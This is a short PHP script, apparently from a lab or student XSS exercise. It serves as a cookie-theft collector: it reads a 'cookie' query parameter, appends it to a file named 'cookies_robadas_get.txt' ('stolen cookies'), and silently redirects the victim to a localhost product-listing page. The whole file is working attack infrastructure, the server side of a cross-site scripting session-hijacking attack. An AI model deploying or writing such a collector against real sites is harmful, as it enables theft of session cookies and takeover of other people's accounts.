<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Obtener la cookie
if (isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    $archivo = __DIR__ . '/cookies_robadas_get.txt';

    // Guardar la cookie en el archivo
    file_put_contents($archivo, $cookie . PHP_EOL, FILE_APPEND);

    // Redirigir usando JavaScript para evitar conflictos con cabeceras PHP
    echo '<script>window.location.href = "http://localhost/FrontEnd/Crud/ListadoDeProductos.php";</script>';
    exit();
} else {
    die("Error: No se recibió ninguna cookie.");
}
?>